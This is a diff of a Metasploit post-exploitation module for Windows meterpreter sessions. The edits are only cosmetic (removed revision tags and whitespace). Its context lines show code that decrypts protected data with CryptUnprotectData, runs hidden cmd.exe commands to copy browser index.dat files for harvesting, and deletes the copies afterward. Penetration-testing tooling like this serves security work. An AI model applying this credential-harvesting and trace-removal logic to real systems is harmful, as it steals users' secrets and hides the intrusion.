@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -30,7 +26,6 @@ class Metasploit3 < Msf::Post
 				versions.
 			},
 			'License'         => MSF_LICENSE,
-			'Version'         => '$Revision$',
 			'Platform'        => ['windows'],
 			'SessionTypes'    => ['meterpreter'],
 			'Author'          => ['Kx499']
@@ -103,7 +98,7 @@ class Metasploit3 < Msf::Post
 		len = pack_add(data.length)
 		eaddr = pack_add(mem2)
 		elen = pack_add((entropy.length + 1)*2)
-		
+
 		#cal railgun to decrypt
 		if is_86
 			ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,1,8)
@@ -112,7 +107,7 @@ class Metasploit3 < Msf::Post
 			ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,1,16)
 			len,add = ret["pDataOut"].unpack("Q2")
 		end
-		
+
 		return "" unless ret["return"]
 		return read_str(add, len, 2)
 	end
@@ -135,7 +130,7 @@ class Metasploit3 < Msf::Post
 		len = pack_add(dlen)
 		eaddr = pack_add(mem)
 		elen = pack_add(ent_sz)
-		
+
 		#prep vars and call function
 		if is_86
 			ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,8)
@@ -285,12 +280,12 @@ class Metasploit3 < Msf::Post
 				#copy file
 				cmd = "cmd.exe /c type \"#{hpath}\" > \"#{base}\\index.dat\""
 				r = session.sys.process.execute(cmd, nil, {'Hidden' => true})
-				
+
 				#loop until cmd is done
 				#while session.sys.process.each_process.find { |i| i["pid"] == r.pid}
 				#end
 				sleep(1)
-				
+
 				#get stuff and delete
 				get_stuff("#{base}\\index.dat", true)
 				cmd = "cmd.exe /c del \"#{base}\\index.dat\""
@@ -305,12 +300,12 @@ class Metasploit3 < Msf::Post
 				#copy file
 				cmd = "cmd.exe /c type \"#{cpath}\" > \"#{base}\\index.dat\""
 				r = session.sys.process.execute(cmd, nil, {'Hidden' => true})
-				
+
 				#loop until cmd is done
 				#while session.sys.process.each_process.find { |i| i["pid"] == r.pid}
 				#end
 				sleep(1)
-				
+
 				#get stuff and delete
 				get_stuff("#{base}\\index.dat", false)
 				cmd = "cmd.exe /c del \"#{base}\\index.dat\""
